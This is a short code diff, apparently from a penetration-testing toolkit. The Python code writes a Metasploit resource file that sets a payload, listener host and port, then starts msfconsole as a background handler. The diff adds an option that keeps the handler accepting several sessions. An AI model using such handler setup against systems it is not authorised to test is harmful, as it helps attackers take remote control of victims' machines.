@@ -71,6 +71,7 @@ if trigger == 2 or trigger == 3:
             filewrite.write("set payload " + line[0] + "\n")
             filewrite.write("set lhost " + line[1] + "\n")
             filewrite.write("set lport " + line[2] + "\n")
+            filewrite.write("set ExitOnSession false\n")
             filewrite.write("exploit -j")
             filewrite.close()
         subprocess.Popen("ruby %s/msfconsole -L -r %s/meta_config" % (msf_path, setdir), shell=True).wait()
